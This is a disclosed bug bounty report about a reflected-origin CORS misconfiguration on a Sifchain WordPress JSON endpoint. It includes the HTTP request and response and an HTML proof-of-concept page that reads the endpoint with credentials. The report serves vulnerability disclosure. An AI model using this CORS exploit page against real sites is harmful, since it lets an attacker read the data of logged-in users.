# CORS Misconfiguration

## Report Details
- **Report ID**: 1194280
- **URL**: https://hackerone.com/reports/1194280
- **State**: Closed
- **Severity**: none
- **Submitted**: 2021-05-12T16:52:34.070Z
- **Disclosed**: 2021-05-12T18:01:22.465Z

## Reporter
- **Username**: itsme_ani
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: sifchain

## Vulnerability Information
Summary:
An cross-origin resource sharing (CORS) policy controls whether and how content running on other domains can perform two-way interaction with the domain that publishes the policy. The policy is fine-grained and can apply access controls per-request based on the URL and other features of the request. If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information.
This bug could be used to steal users information or force the user to execute unwanted actions. As long that a legit and logged in user is lure to access a attacker controlled HTML page.

Vulnerable URL:- https://sifchain.finance/wp-json 

CORS misconfiguration is found on https://sifchain.finance/wp-json   as "Access-Control-Allow-Origin" is dynamically fetched from client Origin header with "Credentials" set as true.

Steps To Reproduce:
Step 1:
Request
GET /wp-json HTTP/1.1
Host: sifchain.finance
Origin: https://bing.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

Response:-
HTTP/1.1 200 OK
Date: Wed, 12 May 2021 16:38:05 GMT
Content-Type: application/json; charset=UTF-8
Connection: close
Strict-Transport-Security: max-age=15552000; includeSubDomains
Vary: Accept-Encoding
X-hacker: If you're reading this, you should visit automattic.com/jobs and apply to join the fun, mention this header.
Host-Header: WordPress.com
X-Robots-Tag: noindex
Link: <https://sifchain.finance/wp-json/>; rel="https://api.w.org/"
X-Content-Type-Options: nosniff
Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages, Link
Access-Control-Allow-Headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
Allow: GET
Access-Control-Allow-Origin: https://bing.com
Access-Control-Allow-Methods: OPTIONS, GET, POST, PUT, PATCH, DELETE
Access-Control-Allow-Credentials: true
Vary: Origin
X-ac: 3.bom _atomic_dca
CF-Cache-Status: DYNAMIC
cf-request-id: 0a030a5f8b00006985c9185000000001
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Server: cloudflare
CF-RAY: 64e51345ae9e6985-BOM
Content-Length: 243085

Note: Take note from request I inject a header Origin: https://bing.com then from response it returns Access-Control-Allow-Origin:  https://bing.com. Which mean there is CORS misconfig here (refer screenshot attached).

Step 2: Exploiting CORS misconfiguration.
1) open https://sifchain.finance/wp-json  in browser then inspect the page and go to console. Run the following code in console and you would find it pops up user information or Open above code in any browser and you would find it pops up user information like the attachment. (Refer Attachment)

<!DOCTYPE html>
<html>
<body>
<center>
<h2>CORS POC Exploit</h2>
<h3>Extract SID</h3>

<div id="demo">
<button type="button" onclick="cors()">Exploit Click here</button>
</div>

<script>
function cors() {
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200) {
document.getElementById("demo").innerHTML = alert(this.responseText);
}
};
xhttp.open("GET", "https://sifchain.finance/wp-json/", true);
xhttp.withCredentials = true;
xhttp.send();
}
</script>

</body>
</html>

Reference Reports:- https://hackerone.com/reports/426165

## Impact

Attacker would treat many victims to visit attacker's website, if victim is logged in, then his personal information is recorded in attacker's server.
If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information. Even if it does not, attackers may be able to bypass any IP-based access controls by proxying through users' browsers.

## Attachments
- 2.png
- 1.png
- 3.png
- 4.png
